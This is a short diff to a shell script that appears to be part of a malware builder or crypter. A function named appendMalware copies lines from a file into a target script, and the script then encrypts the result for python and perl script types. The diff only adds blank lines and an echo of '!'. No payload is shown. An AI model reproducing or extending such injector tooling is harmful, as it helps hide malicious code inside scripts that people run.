@@ -1,5 +1,6 @@
 
 appendMalware() {
+    
     while read fileContent;do
 	printf "%s\n" "${fileContent}" >> "${fileName}"
     done < "${dirfile}"
@@ -27,6 +28,8 @@ scrConfig() {
 	
 	appendMalware
 	
+	echo "!" >> "${fileName}"
+	
 	crypt "python script" "${CRYPT}"
 	;;
     pl) 
@@ -34,7 +37,10 @@ scrConfig() {
 	
 	appendMalware
 	
+	echo "!" >> "${fileName}"
+	
 	crypt "perl script" "${CRYPT}"
+
 	;;
     esac
 
